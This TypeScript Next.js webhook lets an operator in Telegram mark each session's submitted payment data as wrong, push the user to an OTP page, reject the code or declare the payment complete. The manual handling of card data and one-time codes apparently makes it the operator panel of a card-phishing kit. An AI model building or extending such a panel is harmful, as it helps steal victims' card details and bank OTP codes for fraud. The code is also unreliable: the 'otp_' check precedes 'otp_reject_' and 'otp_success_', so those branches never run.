import { NextRequest, NextResponse } from 'next/server';
import { setPaymentStatus } from '../shared-state-vercel';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    console.log('Webhook received:', JSON.stringify(body, null, 2));
    
    // Проверяем, что это callback query (нажатие на кнопку)
    if (body.callback_query) {
      const callbackData = body.callback_query.data;
      const chatId = body.callback_query.message.chat.id;
      const messageId = body.callback_query.message.message_id;
      
      console.log('Callback data:', callbackData);
      
      // Парсим callback data
      if (callbackData.startsWith('reject_')) {
        const sessionId = callbackData.replace('reject_', '');
        console.log('Rejecting payment for session:', sessionId);
        
        // Обновляем статус на rejected
        await setPaymentStatus(sessionId, 'rejected');
        
        // Отвечаем в Telegram
        await answerCallbackQuery(body.callback_query.id, '❌ Данные отмечены как неверные');
        await editMessage(chatId, messageId, '❌ **ДАННЫЕ НЕВЕРНЫЕ** - Пользователь перенаправлен для исправления');
        
      } else if (callbackData.startsWith('otp_')) {
        const sessionId = callbackData.replace('otp_', '');
        console.log('Requesting OTP for session:', sessionId);
        
        // Обновляем статус на otp
        await setPaymentStatus(sessionId, 'otp');
        
        // Отвечаем в Telegram
        await answerCallbackQuery(body.callback_query.id, '✅ Отправляем OTP пользователю');
        await editMessage(chatId, messageId, '✅ **OTP ЗАПРОШЕН** - Пользователь перенаправлен для ввода кода');
        
      } else if (callbackData.startsWith('otp_reject_')) {
        const sessionId = callbackData.replace('otp_reject_', '');
        console.log('Rejecting OTP for session:', sessionId);
        
        // Возвращаем на OTP страницу с ошибкой
        await setPaymentStatus(sessionId, 'otp_error');
        
        await answerCallbackQuery(body.callback_query.id, '❌ Код OTP неверный');
        await editMessage(chatId, messageId, '❌ **КОД OTP НЕВЕРНЫЙ** - Пользователь должен попробовать снова');
        
      } else if (callbackData.startsWith('otp_success_')) {
        const sessionId = callbackData.replace('otp_success_', '');
        console.log('Approving payment for session:', sessionId);
        
        // Обновляем статус на success
        await setPaymentStatus(sessionId, 'success');
        
        await answerCallbackQuery(body.callback_query.id, '✅ Платёж успешно завершён');
        await editMessage(chatId, messageId, '✅ **ПЛАТЁЖ ЗАВЕРШЁН** - Пользователь перенаправлен на страницу успеха');
      }
    }
    
    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Webhook error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}

async function answerCallbackQuery(callbackQueryId: string, text: string) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text: text,
        show_alert: true
      })
    });
    console.log('AnswerCallbackQuery response:', response.status);
  } catch (error) {
    console.error('AnswerCallbackQuery error:', error);
  }
}

async function editMessage(chatId: number, messageId: number, text: string) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: text,
        parse_mode: 'Markdown'
      })
    });
    console.log('EditMessage response:', response.status);
  } catch (error) {
    console.error('EditMessage error:', error);
  }
} 